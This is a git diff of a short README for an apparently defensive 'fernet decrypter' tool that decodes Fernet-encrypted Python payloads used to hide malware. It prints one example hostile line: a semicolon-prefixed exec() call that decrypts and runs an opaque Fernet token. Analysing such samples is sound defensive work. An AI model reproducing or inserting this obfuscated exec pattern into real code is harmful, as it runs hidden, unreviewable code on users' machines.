@@ -1,5 +1,6 @@
 ## fernet decrypter
 this code is simply to decode any type of fernet code that would usually run malware on your computer using python.
+fernet is not only used to run malicious software keep that in mind. i am just giving an example 
 
 ## example of malicious code
 `;exec(Fernet(b'q7MBuNUXpnt4GH9rHx3rNM1_HFsACuJIk1ZCLPBpU7I=').decrypt(b'gAAAAABk8g4eRFjyGDEmrLhaqqcXsILFNwp4eMaESVA1JWnfoVNhhSPBV_1ngtqebygT9MrIQ95jI1aR1fTfmknlOBY_bumaE8dAZ4WotYGKn0K-cRje6R3Ny4G75lRs8bgV5vv50fD0DtiWTKVsT4VP_FeUHA3so_StnOnG-rgPUWkIgiaX9UdRExOsX0eSqzHxP-88zENWuWdYNOflCmEDVdYOhuxYSg=='))`
